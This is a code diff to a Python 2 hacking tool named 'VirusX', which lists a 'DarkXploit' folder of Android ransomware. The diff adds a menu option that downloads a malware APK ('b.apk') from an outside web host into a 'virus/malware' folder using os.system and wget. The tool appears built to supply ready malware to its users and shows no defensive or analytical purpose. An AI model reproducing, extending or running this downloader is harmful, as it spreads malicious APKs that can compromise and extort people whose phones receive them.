@@ -21,9 +21,9 @@ os.system("cd banner;python2 table.py")
 
 def help():
   print
-  print ("\033[44m Hi \033[0m")
-  print ("\033[44m Hello\033[0m")
-  print ("\033[44m Hi\033[0m")
+  print ("\033[44m Developer : Trilok Singh Maitry\033[0m")
+  print ("\033[44m Program : VirusX\033[0m")
+  print ("\033[44m Based On Python\033[0m")
   print
   main()
 
@@ -75,6 +75,19 @@ def main():
 			time.sleep(1)
 			print
 			print "Now check folder virus on "+R+"/DarkXploit/virus/android-ransomware/"
+			time.sleep(1)
+			print ""+B+"[*]"+N+" Job finished"
+			print
+			main()
+  elif dr == "03":
+		dea = raw_input(""+N+"VirusX > ")
+		if dea == "run":
+			time.sleep(1)
+			print ""+B+"[*]"+N+" Downloading virus..."
+			os.system("cd virus;mkdir malware;cd malware;wget http://loolzec.blogwaper.com/files/b.apk")
+			time.sleep(1)
+			print
+			print "Now check folder virus on "+R+"/DarkXploit/virus/malware/"
 			time.sleep(1)
 			print ""+B+"[*]"+N+" Job finished"
 			print
